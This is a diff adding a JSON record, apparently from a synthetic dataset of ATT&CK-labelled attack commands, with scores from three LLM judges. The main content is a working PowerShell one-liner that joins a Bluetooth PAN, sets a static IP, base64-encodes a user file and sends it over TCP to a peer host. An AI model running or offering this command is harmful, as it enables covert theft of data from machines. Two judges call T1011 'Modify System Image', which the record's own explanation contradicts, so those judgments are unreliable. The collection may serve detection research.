@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.29.61.2 255.255.255.252 | Out-Null; $b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Desktop\\notes.txt')); $client=New-Object Net.Sockets.TcpClient; $client.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.29.61.2'),0)); $client.Connect('172.29.61.1',54721); $strm=$client.GetStream(); $pref=[Text.Encoding]::UTF8.GetBytes('DATA:'); $dat=[Text.Encoding]::UTF8.GetBytes($b64); $suf=[Text.Encoding]::UTF8.GetBytes(':END'); $strm.Write($pref,0,$pref.Length); $strm.Write($dat,0,$dat.Length); $strm.Write($suf,0,$suf.Length); $strm.Close(); $client.Close()",
+  "explanation": "Encodes content and sends it over a custom TCP service bound to the Bluetooth interface, ensuring exfiltration flows over the Bluetooth medium (T1011).",
+  "rationale_steps": [
+    "Initiate the Bluetooth NAP connection.",
+    "Configure the Bluetooth NIC with a static address via netsh.",
+    "Bind the TCP socket to the Bluetooth IP to constrain medium.",
+    "Transmit base64 payload wrapped in innocuous markers over a high port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-7cae3b7b",
+  "source_prompt_hash": "f4a0ca3c",
+  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax for variable assignments, method calls, and piping operations.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does establish a Bluetooth connection and exfiltrate data over that channel, it doesn't actually modify any system image or firmware as described in T1011 (Modify System Image), making it misaligned with the claimed technique.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T19:23:03.760546Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed for Powershell, with correct syntax for variables, cmdlets, .NET calls, and command separators.",
+        "semantic_score": 0,
+        "semantic_justification": "The command performs data exfiltration over a network, which has no functional relation to MITRE ATT&CK T1011 (Modify System Image); additionally, the `netsh` command requires elevated privileges, but the provided context states 'Privilege: None', rendering a key part of the networking setup (binding to the specified Bluetooth interface IP) semantically impossible as written.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T19:23:24.491155Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell one-liner uses valid separators, balanced quotes/parentheses, and correctly formed .NET and cmd invocations.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly exfiltrates data over a Bluetooth PAN by connecting to a NAP, configuring the interface, binding a TCP client to that IP, and sending base64 content, though it assumes the presence of BluetoothCL, a reachable peer, and may fail without admin rights for netsh.",
+        "combined_score": 4.5,
+        "confidence": 0.7,
+        "timestamp": "2025-10-02T19:23:41.980089Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
